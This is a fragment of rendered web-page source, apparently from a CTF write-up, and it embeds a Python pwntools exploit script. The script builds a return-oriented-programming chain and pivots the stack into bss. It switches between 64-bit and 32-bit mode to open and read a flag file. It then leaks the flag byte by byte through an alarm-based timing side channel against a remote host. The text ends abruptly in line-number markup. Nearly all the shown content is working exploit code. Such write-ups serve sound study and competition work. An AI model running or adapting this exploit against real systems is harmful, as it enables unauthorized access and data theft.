"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" bss \nfake_rbp "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" bss\nbuf "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" fake_rbp "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x8")]),s._v("\n\nalarm "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x000000000401150")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("exp")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("idx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#cn = process('./gadget')")]),s._v("\n    cn "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"81.69.0.47"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2102")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    payload "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'a'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x30")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# read(0, buf, 0x200)")]),s._v("\n            poprdi_jmprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            poprsi_1_jmprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ptr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            popr12_popr14_2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x300")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" poprbp_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            movrdx_callr14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            poprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            syscall_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# leave stack->fake_rbp(in bss)")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# poprdi_poprbp, ptr, fake_rbp, ")]),s._v("\n            poprbp_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" fake_rbp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            leave2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n        arch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'amd64'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    stack "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ptr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" arch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'amd64'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    flag_str "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'./test\\x00'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("ljust"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x40")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'\\x00'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n    to32 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            retfq"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x23")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n        arch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'amd64'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n\n    rop32 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("  flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# open(flag, 0, 0)")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# eax=5, ebx=flag, ecx=0, edx=0, ")]),s._v("\n            poprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            poprbx_popr14_2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" buf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            poprcx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            int80"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            retfq"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x33")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n        arch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'i386'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n\n    rop64 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# read(3, flag, 0x40)")]),s._v("\n            poprdi_poprbp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            poprsi_2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" buf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            popr12_popr14_2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x40")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" poprbp_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            movrdx_callr14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            poprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            syscall_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# alarm([flag+idx])")]),s._v("\n\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# rax = idx")]),s._v("\n            poprax"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" idx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# rsi = flag ")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# r14 = alarm")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# rbx = 0")]),s._v("\n            poprbx_popr14_2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" alarm"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# [flag+idx]")]),s._v("\n            movrdi"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n            loop"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n        arch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'amd64'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    rop "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" stack "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" flag_str  "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" to32 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" rop32 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" rop64\n\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# gdb.attach(cn, cmd)")]),s._v("\n    cn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("send"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    start "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" time"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("time"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    cn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rop"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# cn.interactive()")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("try")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        cn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("except")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("\n    end "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" time"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("time"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    cn"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("close"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    pass_time "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("int")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("end"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("start"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("pass_time"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    flag"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("idx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" pass_time\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("bytes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("flag"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\npool "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nflag "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("33")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" i "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("range")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("33")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    t "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" threading"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Thread"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("target"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("exp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" args"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    pool"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("append"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("start"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" i "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" pool"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("join"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("bytes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("flag"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# exp(0)")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br"),a("span",{staticClass:"line-number"},[s._v("64")]),a("br"),a("span",{staticClass:"line-number"},[s._v("65")]),a("br"),a("span",{staticClass:"line-number"},[s._v("66")]),a("br"),a("span",{staticClass:"line-number"},[s._v("67")]),a("br"),a("span",{staticClass:"line-number"},[s._v("68")]),a("br"),a("span",{staticClass:"line-number"},[s._v("69")]),a("br"),a("span",{staticClass:"line-number"},[s._v("70")]),a("br"),a("span",{staticClass:"line-number"},[s._v("71")]),a("br"),a("span",{staticClass:"line-number"},[s._v("72")]),a("br"),a("span",{staticClass:"line-number"},[s._v("73")]),a("br"),a("span",{staticClass:"line-number"},[s._v("74")]),a("br"),a("span",{staticClass:"line-number"},[s._v("75")]),a("br"),a("span",{staticClass:"line-number"},[s._v("76")]),a("br"),a("span",{staticClass:"line-number"},[s._v("77")]),a("br"),a("span",{staticClass:"line-number"},[s._v("78")]),a("br"),a("span",{staticClass:"line-number"},[s._v("79")]),a("br"),a("span",{staticClass:"line-number"},[s._v("80")]),a("br"),a("span",{staticClass:"line-number"},[s._v("81")]),a("br"),a("span",{staticClass:"line-number"},[s._v("82")]),a("br"),a("span",{staticClass:"line-number"},[s._v("83")]),a("br"),a("span",{staticClass:"line-number"},[s._v("84")]),a("br"),a("span",{staticClass:"line-number"},[s._v("85")]),a("br"),a("span",{staticClass:"line-number"},[s._v("86")]),a("br"),a("span",{staticClass:"line-number"},[s._v("87")]),a("br"),a("span",{staticClass:"line-number"},[s._v("88")]),a("br"),a("span",{staticClass:"line-number"},[s._v("89")]),a("br"),a("span",{staticClass:"line-number"},[s._v("90")]),a("br"),a("span",{staticClass:"line-number"},[s._v("91")]),a("br"),a("span",{staticClass:"line-number"},[s._v("92")]),a("br"),a("span",{staticClass:"line-number"},[s._v("93")]),a("br"),a("span",{staticClass:"line-number"},[s._v("94")]),a("br"),a("span",{staticClass:"line-number"},[s._v("95")]),a("br"),a("span",{staticClass:"line-number"},[s._v("96")]),a("br"),a("span",{staticClass:"line-number"},[s._v("97")]),a("br"),a("span",{staticClass:"line-number"},[s._v("98")]),a("br"),a("span",{staticClass:"line-number"},[s._v("99")]),a("br"),a("span",{staticClass:"line-number"},[s._v("100")]),a("br"),a("span",{staticClass:"line-number"},[s._v("101")]),a("br"),a("span",{staticClass:"line-number"},[s._v("102")]),a("br"),a("span",{staticClass:"line-number"},[s._v("103")]),a("br"),a("span",{staticClass:"line-number"},[s._v("104")]),a("br"),a("span",{staticClass:"line-number"},[s._v("105")]),a("br"),a("span",{staticClass:"line-number"},[s._v("106")]),a("br"),a("span",{staticClass:"line-number"},[s._v("107")]),a("br"),a("span",{staticClass:"line-number"},[s._v("108")]),a("br"),a("span",{staticClass:"line-number"},[s._v("109")]),a("br"),a("span",{staticClass:"line-number"},[s._v("110")]),a("br"),a("span",{staticClass:"line-number"},[s._v("111")]),a("br"),a("span",{staticClass:"line-number"},[s._v("112")]),a("br"),a("span",{staticClass:"line-number"},[s._v("113")]),a("br"),a("span",{staticClass:"line-number"},[s._v("114")]),a("br"),a("span",{staticClass:"line-number"},[s._v("115")]),a("br"),a("span",{staticClass:"line-number"},[s._v("116")]),a("br"),a("span",{staticClass:"line-number"},[s._v("117")]),a("br"),a("span",{staticClass:"line-number"},[s._v("118")]),a("br"),a("span",{staticClass:"line-number"},[s._v("119")]),a("br"),a("span",{staticClass:"line-number"},[s._v("120")]),a("br"),a("span",{staticClass:"line-number"},[s._v("121")]),a("br"),a("span",{staticClass:"line-number"},[s._v("122")]),a("br"),a("span",{staticClass:"line-number"},[s._v("123")]),a("br"),a("span",{staticClass:"line-number"},[s._v("124")]),a("br"),a("span",{staticClass:"line-number"},[s._v("125")]),a("br"),a("span",{staticClass:"line-number"},[s._v("126")]),a("br"),a("span",{staticClass:"line-number"},[s._v("127")]),a("br"),a("span",{staticClass:"line-number"},[s._v("128")]),a("br"),a("span",{staticClass:"line-number"},[s._v("129")]),a("br"),a("span",{staticClass:"line-number"},[s._v("130")]),a("br"),a("span",{staticClass:"line-number"},[s._v("131")]),a("br"),a("span",{staticClass:"line-number"},[s._v("132")]),a("br"),a("span",{staticClass:"line-number"},[s._v("133")]),a("br"),a("span",{staticClass:"line-number"},[s._v("134")]),a("br"),a("span",{staticClass:"line-number"},[s._v("135")]),a("br"),a("span",{staticClass:"line-number"},[s._v("136")]),a("br"),a("span",{staticClass:"line-number"},[s.